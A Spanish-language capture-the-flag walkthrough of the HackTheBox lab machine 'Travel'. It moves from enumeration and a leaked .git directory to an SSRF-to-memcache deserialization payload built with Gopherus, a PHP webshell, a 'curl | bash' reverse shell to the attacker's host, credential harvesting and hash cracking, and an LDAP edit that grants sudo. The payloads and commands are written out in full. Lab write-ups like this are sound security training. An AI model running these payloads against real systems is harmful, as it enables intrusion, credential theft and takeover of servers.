

[*] Enumeración

Para ver si la máquina está activa, además obtenemos la información de que es una máquina linux (ttl=63)
#ping -c 1 10.10.10.189


Escaneo de los puertos 
#nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.189 -oG allPorts
	Puetos abiertos: 22,80,443

#nmap -sC -sV -p22,80,443 10.10.10.189 -oN targeted
	commonName=www.travel.htb/
	DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
	
	#nano /etc/hosts
	Para meter los dns
		#10.10.10.189    travel.htb blog.travel.htb blog-dev.travel.htb

	Además como es OpenSSL nos podemos conectar a la máquina como cliente para inspeccionar el certificado
	#openssl s_client -connect 10.10.10.189:443

---------------------------------------------------------------------------------------------------------------------------------
Fuzzing nmap

Itera sobre los dominios y lanza el http-enum para cada uno, exportando las evidencias en su respectivo archivo 
#for domain in travel.htb blog.travel.htb blog-dev.travel.htb; do nmap --script http-enum -p80 $domain -oN ${domain}_webScan ; done
		
	Para blog.travel nos ha salido:
	PORT   STATE SERVICE
	80/tcp open  http
		| http-enum: 
		|   /wp-login.php: Possible admin folder
		|   /wp-json: Possible admin folder	
		|   /robots.txt: Robots file
		|   /readme.html: Wordpress version: 2 
		|   /: WordPress version: 5.4
		|   /feed/: Wordpress version: 5.4
		|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
		|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
		|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
		|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
		|   /wp-login.php: Wordpress login page.
		|   /wp-admin/upgrade.php: Wordpress login page.
		|   /readme.html: Interesting, a readme.
		|_  /0/: Potentially interesting folder


	Para blog-dev.travel.htb nos ha salido:	
	PORT   STATE SERVICE
	80/tcp open  http
		| http-enum: 
		|_  /.git/HEAD: Git folder



Como es un wordpress utilizamos wpscan para ver usuarios pueden existir
#wpscan --url "http://blog.travel.htb/" --enumerate u
	Solo nos reporta admin


Si miramos el códido fuente de blog.travel.htb/awesome-rss
	encontramos "debug" por lo que podemos intuir que tenemos un acceso al uso de la variable debug -> /?debug=asdasd

Encontramos data serializada

-------------------------------------------------------------------------------------------------------------------------------------

.GIT

Como veemos que tenemos un .git en la página web, pero cuando intentamo acceder a él no tenemos acceso, acceso no autorizado
utilizamos la herramienta git dumper

#./git_dumper.py http://blog-dev.travel.htb/.git/ /home/dimegio/Dimegio/HTB/Travel/content/.

Tras inspeccionar el rss_template.php veemos que podemos subir nuestro customfeed.xml indicanoselo con la variable custom_feed_url
que en otro caso cargará la paǵina de por defecto

Descargamos el customfeed
#wget http://www.travel.htb/newsfeed/customfeed.xml 

Modificamos y compartimos mediante python el archivo.xml
#python3 -m http.server 80

Para que cargue nuestra propia feed
#http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.16.2/customfeed.xml

En las primera líneas del script veemos que utiliza: /wp-includes/class-simplepie.php
Buscando por internete el nombre del archivo
#https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php

Encontramos en github el script, en el cual si buscamos por md5, ya que por el formato en el que sale en debug, creemos que se trata de un hash md5, en que veemos que llama a una función donde le pasa el md5
Investigando, y sabiendo que utiliza memcache:
#https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcache.php
Encontramos: 
md5("$name:$type")
En el que suponemos que type sería 'spc' por la página de class-simplepie.php


Si nos abrimos el php interative
#php --interactive

#php > echo md5("http://www.travel.htb/newsfeed/customfeed.xml");
3903a76d1e6fef0d76e973a0561cbfc0
#php > echo md5(md5("http://www.travel.htb/newsfeed/customfeed.xml") . ":spc");
4e5612ba079c530a6b1f148c0b352241

Para concatenarlo con xct_ introducimos: 
#php > echo "xct_" .  md5(md5("http://www.travel.htb/newsfeed/customfeed.xml") . ":spc");
xct_4e5612ba079c530a6b1f148c0b352241

Nos sale el hash que veemos en el debug
Si fuera nuestro custom feed, sería: md5("http://10.10.16.2/customfeed.xml")

Si veemos el otro archivo php, vemos que hay una clase, la cual lo que hace es crear un archivo, con la data, y lo almacena en /logs/
por lo que lo que podemos hacer es utilizar la herramienta: Gopherus para serializar la data:

Primero que todo modificamos y nos creamos nuestro propio script donde estableceremos una variable de entorno: cmd con la que ejecutaremos comandos a nivel de sistema, es decir, 
nos generaremos una webshell

para ello, una vez, modificado la clase y hecho el script, lo interpretamos
#php serialize.php
	O:14:"TemplateHelper":2:{s:4:"file";s:9:"pwned.php";s:4:"data";s:34:"<?php system($_REQUEST['cmd']); ?>";}

Bien una vez teniendo la data serializada
Ejecutamos ghopherus
#./gopherus.py --exploit phpmemcache
E ponemos la data serializada

	gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20106%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22pwned.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27cmd%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a

Lo metemos en el navegador, pero cambiando la IP

http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7f000001:11211/_%0d%0aset%20SpyD3r%204%200%20106%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22pwned.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27cmd%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a

La cosa es que tenemos que modificar el valor de SpyD3r para que sea coherente con el de la página web


view-source:http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php
http://blog.travel.htb/awesome-rss/

Si cargamos el payload y cambiamos el nombre al hash md5: 
http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7f000001:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20106%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22pwned.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27cmd%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
Si recargamos la página de inicio, veremos que no carga nada, eso sería funcional ya

Ahora ya podríamos introducir comandos: 
http://blog.travel.htb/wp-content/themes/twentytwenty/logs/pwned.php?cmd=whoami

Ahora ya podemos inyectar la reverse shell, que hemos la hemos creado en index.html
por lo que: 
compartimos por python:
#python3 -m http.server 80

Nos ponemos a la escucha con netcat
#nc -nlvp 443

Y ejecutamos el comando:
#http://blog.travel.htb/wp-content/themes/twentytwenty/logs/pwned.php?cmd=curl%20http://10.10.16.2%20|%20bash

Hacemos el tratamiento de la stty

Si hacemos un 
#ls -la /
nos damos cuenta de que estamos en un contenedor de docker por el archivo .dockerenv
además si hacemos:
#hostname -I
Veremos que tenemos otra IP de la de la máquina

Como es un wordpress, nos vamos var/www/html y todos los archivos de wordpress están ah, en el config, podemos encontrar 
crendenciales para acceder a la base de datos

wp:fiFtDDV9LYe8Ti

por lo que accedemos a esta:
#mysql -uwp -p


Listamos las bases de datos:
#show databases;

Entramos en la base de datos:
#use wp;

Listamos las tablas existentes en la base de datos:
#show tables;

Lisamos las columnas exitentes de la tabla wp_users:
#describe wp_users;

Visualizamos la información que nos interesa, los usuarios y las contraseñas:
#select user_login, user_pass FROM wp_users;
	admin      | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/

Es un hash por lo que intamos romperlo


Por otro lado si nos vamos a /opt, nos encontramos con un backup, donde si visualizamos el contenido que es .sql, encontramos otro usuario potencial con su contraseña hasheada
#john --wordlist=/usr/share/wordlists/rockyou.txt hash

Y encontramos: 
1stepcloser      (lynik-admin)

Probamos a meternos en la máquina principal por ssh mediante el usuario encontrado:
#ssh lynik-admin@10.10.10.189



Una vez estando dentro, mirando el contenido personal del usaurio, veemos que en .viminfo hay una credencial expuesta
Por otro lado en el .ladprc nos indica el HOST, la BASE y el BINDDN
#ldapsearch -x -h ldap.travel.htb -w 'Theroadlesstraveled'

Nosotros vamos a utilizar el ApacheDirectoryStudio el cual lo podemos descargar desde:
https://directory.apache.org/studio/download/download-linux.html

Antes de utilizarlo, lo que tenemos que hacer es un portforwarding, ya que ldap es un servicio interno
Entramos en el modo iteractivo de ssh: 

ENTER
~
C

ssh > -L 9389:ldap.travel.htb:389

#ldapsearch -w 'Theroadlesstraveled' -D 'cn=lynik-admin,dc=travel,dc=htb' -b 'dc=travel,dc=htb' -h localhost:9389

Abriendo el ApacheDirectoryStudio, creamos una nueva conexión donde, metemos nuestra IP, puerto y el (-D)
Nos iríamosa un usario y le crearíamos una nueva contraseña, seguido de la generación de una clave publica, donde pegariamos nuestra propia clave publica
Además como grupo le podemos asignar el grupo sudoers, (27) para posteriormente escalar privilegios

#ssh-keygen 
para generar claves

#cat id_rsa.pub | tr -d '\n' | xclip -sel clip
	para copiar la id_rsa.pub a la clipboard

Finalmente accederíamos mediante ssh al usuario en el que le hemos estado aplicando las modificaciones

#ssh lynik@10.10.10.189

Una vez dentro, como ya estamos en el grupo sudoers, simplemente hacemos sudo su, y ponemos la contraseña que le habíamos asignado anteriormente al usaurio
De manera que nos convertimos en root
